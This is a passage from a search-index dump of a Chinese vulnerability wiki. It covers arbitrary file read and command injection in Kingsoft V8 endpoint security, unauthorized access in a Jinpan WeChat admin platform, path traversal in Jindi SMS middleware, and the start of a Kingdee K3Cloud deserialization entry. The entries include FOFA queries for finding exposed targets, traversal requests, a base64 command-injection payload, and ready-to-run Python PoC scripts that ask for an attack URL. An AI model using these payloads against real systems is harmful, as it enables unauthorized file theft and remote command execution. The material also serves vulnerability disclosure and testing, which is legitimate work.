","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-v9-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-v9-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金山 V8 终端安全系统 downfile.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金山 V8 终端安全系统 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"在线安装-V8+终端安全系统Web控制台\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件 /Console/htmltopdf/downfile.php \u003c?php $filename= $_GET[\"filename\"]; $filename=iconv(\"UTF-8\",\"GBK//IGNORE\", $filename); header(\"Cache-Control: public\"); header(\"Content-Description: File Transfer\"); header('Content-disposition: attachment; filename='.$filename); //文件名 header(\"Content-Type: application/zip\"); //zip格式的 header(\"Content-Transfer-Encoding: binary\"); //告诉浏览器，这是二进制文件 header('Content-Length: '. filesize($filename)); //告诉浏览器，文件大小 @readfile($filename); ?\u003e 文件中没有任何的过滤 通过filename参数即可下载任意文件 POC为 http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 金山 V8 终端安全系统 任意文件读取漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/htmltopdf/downfile.php?filename=downfile.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"$filename\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞 , 响应为:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-downfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金山 V8 终端安全系统 get_file_content.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金山 V8 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金山 V8 终端安全系统 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"在线安装-V8+终端安全系统Web控制台\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件/Console/receive_file/get_file_content.php \u003c?php if(stripos($_POST['filepath'],\"..\") !== false) { echo 'no file founggd'; exit(); } ini_set(\"open_basedir\", \"../\"); $file_path = '../'.iconv(\"utf-8\",\"gb2312\",$_POST['filepath']); if(!file_exists($file_path)){ echo 'no file founggd'; exit(); } $fp=fopen($file_path,\"r\"); $file_size=filesize($file_path); $buffer=5024; $file_count=0; while(!feof($fp) \u0026\u0026 $file_count\u003c$file_size){ $file_con=fread($fp,$buffer); $file_count+=$buffer; echo $file_con; } fclose($fp); ?\u003e 文件中没有任何的过滤 通过 filepaht 参数即可下载任意文件 由于不能出现 .. ，所以只能读取web目录下的文件 POST /receive_file/get_file_content.php filepath=login.php ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-get_file_content.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金山 V8 终端安全系统 pdf_maker.php 存在命令执行漏洞，由于没有过滤危险字符，导致构造特殊字符即可进行命令拼接执行任意命令 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金山 V8 终端安全系统 ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"猎鹰安全-金山V8+终端安全系统\" ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 存在漏洞的文件为 Kingsoft\\Security Manager\\SystemCenter\\Console\\inter\\pdf_maker.php \u003c?php require_once (dirname(__FILE__).\"\\\\common\\\\HTTPrequest_SCpost.php\"); /* { \"kptl\" : { \"set_exportpdf_cmd\" : { \"url\" : \"http://172.18.254.146/report/system/main.php?userSession=5784727B-7AEA-4EFE-B0CB-DDD6DA1CABD3\u0026guid=1AC380D9- 580C-49A8-B6EC-787CF50FA928\u0026VHierarchyID=ADMIN\", \"fileName\":\"test.pdf\" } } */ //$post = file_get_contents(\"php://input\"); /* $post = array(\"kptl\"=\u003e array(\"set_exportpdf_cmd\"=\u003earray( \"url\"=\u003e\"http://172.18.254.146/report/system/main.php?userSession=5784727B-7AEA-4EFE-B0CB-DDD6DA1CABD3\u0026guid=1AC380D9-580C-49A8-B6EC-787CF50FA928\u0026VHierarchyID=ADMIN\", \"fileName\"=\u003e\"test1234.pdf\" ) )); */ $url = $_POST[\"url\"]; $fileName = $_POST[\"fileName\"]; $batName=$fileName; if ($url == null || $fileName == null) { $return[\"nResult\"] = __LINE__; echo json_encode($return,JSON_UNESCAPED_UNICODE); return ; } $url = base64_decode($url); $nameStr = base64_decode($fileName).date(\"Y-m-d\").\".pdf\"; $fileName=\"..\\\\htmltopdf\\\\\".$nameStr; system('mkdir ..\\\\htmltopdf'); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url.'\" '.$fileName; if (getApacheVersion()\u003e=24) { //apache 2.4 php 7 版本 只能在 bat中运行 $cmd =\" del \".$fileName; exec($cmd); $url_= str_replace('%','%%', $url); $cmd = '..\\\\..\\\\wkhtmltopdf.exe \"'.$url_.'\" '.$fileName; $batName =\"exec_wkhtmltopdf.bat\"; $myfile = fopen($batName , \"w\"); //$cmd =iconv(\"UTF-8\", \"gbk\", $cmd ); fwrite($myfile, $cmd); fclose($myfile); $cmd =$batName ; exec($cmd); $cmd =\" del \".$batName; exec($cmd); }else { system($cmd); } // echo $url; $return = array(\"nResult\" =\u003e \"0\",\"fileName\" =\u003e$nameStr,\"url\"=\u003e$url); echo json_encode($return,JSON_UNESCAPED_UNICODE); ?\u003e 这里传入 base64加密的拼接命令即可执行任意命令 \"|| ipconfig || --base64--\u003e url=IiB8fCBpcGNvbmZpZyB8fA==\u0026fileName=xxx ![2](C:\\Users\\47236\\Desktop\\2.png)POST /inter/pdf_maker.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 45 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D\u0026fileName=xxx ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mTitle : 金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/inter/pdf_maker.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"url=IiB8fCBpcGNvbmZpZyB8fA==\u0026fileName=xxx\" try: response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if \"Windows\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {} 存在漏洞 ,执行 ipconfig, 响应为:\\n{} \\033[0m\".format(target_url, response.text)) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%87%91%E5%B1%B1-v8-%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F-pdf_maker.php-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金盘 微信管理平台 getsysteminfo 未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限 ","date":"0001-01-01","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金盘 微信管理平台 ","date":"0001-01-01","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"微信管理后台\" \u0026\u0026 icon_hash=\"116323821\" ","date":"0001-01-01","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /admin/weichatcfg/getsysteminfo ","date":"0001-01-01","objectID":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"金笛 短信中间件Web版 log 后台任意文件下载漏洞 CNVD-2021-57336 ","date":"0001-01-01","objectID":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/"},{"categories":null,"content":"漏洞描述 金笛 短信中间件Web版后台存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器任意文件信息 ","date":"0001-01-01","objectID":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/"},{"categories":null,"content":"漏洞影响 金笛 短信中间件Web版 ","date":"0001-01-01","objectID":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/:2:0","tags":null,"title":"","uri":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/"},{"categories":null,"content":"网络测绘 app=\"金笛短信中间件(WEB版)\" ","date":"0001-01-01","objectID":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/:3:0","tags":null,"title":"","uri":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的位置为 日志下载 验证POC /log?action=view\u0026pageIndex=1\u0026name=../../../windows/win.ini ","date":"0001-01-01","objectID":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/:4:0","tags":null,"title":"","uri":"/%E9%87%91%E7%AC%9B-%E7%9F%AD%E4%BF%A1%E4%B8%AD%E9%97%B4%E4%BB%B6web%E7%89%88-log-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E-cnvd-2021-57336/"},{"categories":null,"content":"金蝶 K3Cloud BinaryFormatter 反序列化漏洞 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 由于金蝶云星空能够使用 format 参数指定数据格式为二进制，攻击者可以通过发送由 BinaryFormatter 恶意序列化后的数据让服务端进行危险的BinaryFormatter 反序列化操作。反序列化过程中没有对数据进行签名或校验，导致攻击者可以在未授权状态下进行服务器远程代码执行。 ","date":"0001-01-01","objectID":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%87%91%E8%9D%B6-k3cloud-binaryformatter-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 金蝶云星空 \u003c 6.2.1012.4 7.0.352.16 \u003c 金蝶云星空 \u003c7.7.0.202111 8.0.0.202205 \u003c 金蝶云星空 \u003c 8.1.0.20221110 